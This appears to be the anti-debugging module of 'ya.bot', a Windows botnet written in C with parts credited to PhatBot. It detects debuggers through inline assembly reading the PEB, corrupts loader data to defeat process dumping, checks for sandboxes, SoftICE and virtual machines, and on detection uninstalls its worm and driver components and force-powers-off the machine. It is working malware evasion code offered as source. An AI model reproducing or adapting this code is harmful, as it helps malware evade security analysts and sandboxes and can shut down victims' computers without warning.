/*  ya.bot  */

#include "bot.h"

#ifndef NO_ANTIDEBUG
DWORD WINAPI antidebug_detectdebugger(LPVOID param)
{
	bool bPresent = FALSE;

#ifndef NO_DEBUG
		debug_print("Starting anti-debug thread, antidebug_debuggers()");
#endif

	while (TRUE)
	{
		_asm
		{
				push eax
				mov eax, FS:[18h]
				mov eax, [eax + 30h]
				movzx eax, BYTE PTR[eax + 2]
				test eax, eax
				jnz DebuggerPresent

				jmp End

				DebuggerPresent:
				mov bPresent, TRUE

				End:
				pop eax
		}
		if (bPresent)
				antidebug_payload();
			Sleep(10);
	}
		thread_remove(THREAD_ANTIDEBUG);
		return 0;
}

void antidebug_payload()
{

#ifndef NO_DEBUG
		debug_print("Running detection payload, antidebug_payload()");
#endif

#ifndef NO_PERSIST
		TerminateThread(g_hPersistThread, 0);
		CloseHandle(g_hPersistThread);
#endif

#ifndef NO_INSTALLDRIVER
		uninstall_driver();
#endif

#ifndef NO_INSTALLWORMRIDE
		uninstall_wormride();
#endif

#ifndef NO_INSTALLBOT
		uninstall_bot();
		uninstall_botmelt();
#endif

		ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, 0);
		ExitProcess(0);
		return;
}

//botbotbotbotbotbotbotbotbotbotbotbotbot
//Original code from PhatBot
//botbotbotbotbotbotbotbotbotbotbotbotbot

void antidebug_procdump()
{

#ifndef NO_DEBUG
		debug_print("Messing up procdump, antidebug_procdump()");
#endif

	__asm
	{
			mov eax, fs:[0x30]
			mov eax, [eax + 0xC]
			mov eax, [eax + 0xC]
			add dword ptr [eax + 0x20], 0x2000
	}
		return;
}

//botbotbotbotbotbotbotbotbotbotbotbotbot
//Original code by Andvare, RunningBon & p0ke
//botbotbotbotbotbotbotbotbotbotbotbotbot

void antidebug_sandbox()
{
	DWORD dwAddress, dwTime1, dwTime2, dwTime3;
	HMODULE hModule;
	unsigned char szBytes[] =
	{
			0xc8,
			0x0,
			0x4,
			0x0,
			0x60
	};

#ifndef NO_DEBUG
		debug_print("Checking for sandbox, antidebug_sandbox()");
#endif

	if (MessageBoxA((HWND)0xFFFFFFFF, NULL, NULL, MB_OK))
			ExitProcess(0);
		dwTime1 = GetTickCount();
		Sleep(10);
		dwTime2 = GetTickCount();
		Sleep(10);
		dwTime3 = GetTickCount();
	if (((dwTime2 - dwTime1) < 10) && ((dwTime3 - dwTime1) < 20))
			ExitProcess(0);
	if (*PDWORD(0x7C800140) == 0x0)
			ExitProcess(0);
		hModule = GetModuleHandle(string_user32library);
		dwAddress = (DWORD)GetProcAddress(hModule, string_antidebugmessageboxafunction);
	if (memcmp((LPVOID)dwAddress, (LPVOID)szBytes, sizeof(szBytes)) == 0)
			ExitProcess(0);
		return;
}

//botbotbotbotbotbotbotbotbotbotbotbotbot
//Original code from PhatBot
//botbotbotbotbotbotbotbotbotbotbotbotbot

bool antidebug_softice()
{
	HANDLE hFile;

#ifndef NO_DEBUG
		debug_print("Checking for SoftICE, antidebug_softice()");
#endif

		hFile = CreateFile(string_antidebugsofticepath,
				GENERIC_READ | GENERIC_WRITE,
				FILE_SHARE_READ | FILE_SHARE_WRITE,
				NULL,
				OPEN_EXISTING,
				FILE_ATTRIBUTE_NORMAL,
				NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
			CloseHandle(hFile);
			return TRUE;
	}
		CloseHandle(hFile);
		return FALSE;
}

//botbotbotbotbotbotbotbotbotbotbotbotbot
//Original code by Joanna Rutkowska
//http://invisiblethings.org/
//botbotbotbotbotbotbotbotbotbotbotbotbot

bool antidebug_vm() // FIXME gives false positives sometimes
{
/*	unsigned char rpill[] =
			"\x0F\x01\x0D\x00\x00\x00\x00\xC3";
	unsigned char m[2 + 4];

#ifndef NO_DEBUG
		debug_print("Checking for virtual machine, antidebug_vm()");
#endif

		*((unsigned *)&rpill[3]) = (unsigned)m;
	__asm 
	{
			lea eax, rpill
			call eax
	}
	if (m[5] > 0xD0)
			return TRUE;*/
		return FALSE;
}
#endif